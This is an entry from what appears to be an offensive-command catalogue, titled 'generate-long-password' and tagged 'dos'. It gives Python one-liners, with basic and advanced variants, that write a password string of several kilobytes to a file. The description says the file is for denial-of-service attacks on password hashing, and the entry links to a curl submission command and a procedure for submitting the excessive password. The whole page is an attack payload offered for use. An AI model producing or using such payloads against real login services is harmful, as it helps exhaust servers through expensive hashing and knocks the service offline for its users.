---
id: d4e5f6g7-h8i9-0123-defg-456789012345
data: python3 -c 'print("Crissrock3%40" * 40)' > long_password.txt
tags:
  - string-generation
  - dos
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:26:30.490Z'
verified: false
validated: true
submitted: true
---
# generate-long-password

## Command

```bash
python3 -c 'print("Crissrock3%40" * 40)' > long_password.txt
```

## Description

This command uses Python to generate an excessively long password string by repeating a base pattern, saving it to a file for use in DoS attacks targeting password hashing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `"Crissrock3%40" * 40` | Base string repeated 40 times; adjust repetition for length | Yes |
| `> long_password.txt` | Redirects output to file | Yes |

## Examples

### Basic Usage

```bash
python3 -c 'print("A" * 1000)' > short_test.txt
```

### Advanced Usage

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"Crissrock3%40" * 1000)' > very_long_password.txt
```

## Expected Output

Creates a file `long_password.txt` with the repeated string. Verify with `wc -c long_password.txt` showing ~ several KB or more.

## Related

- [[commands/curl-submit-long-password]]
- [[procedures/Submit-Excessive-Password-for-DoS]]
